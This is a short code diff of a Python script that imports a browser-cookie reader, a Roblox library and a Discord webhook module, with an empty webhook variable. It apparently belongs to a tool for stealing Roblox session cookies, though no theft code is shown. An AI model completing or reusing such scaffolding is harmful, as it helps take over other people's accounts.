@@ -3,21 +3,16 @@
 import os
 import codecs
 import json
-
+import robloxpy
+import requests,re
+from discordwebhook import *
+import browser_cookie3
 webhookk = ""
 
 def command(c):
     os.system(c)
 def cls():
     os.system("cls")
-
-try:
-    import robloxpy
-    import requests,re
-    from discordwebhook import *
-    import browser_cookie3
-except:
-    input("Libraries not installed press enter to exit...")
 
 
 
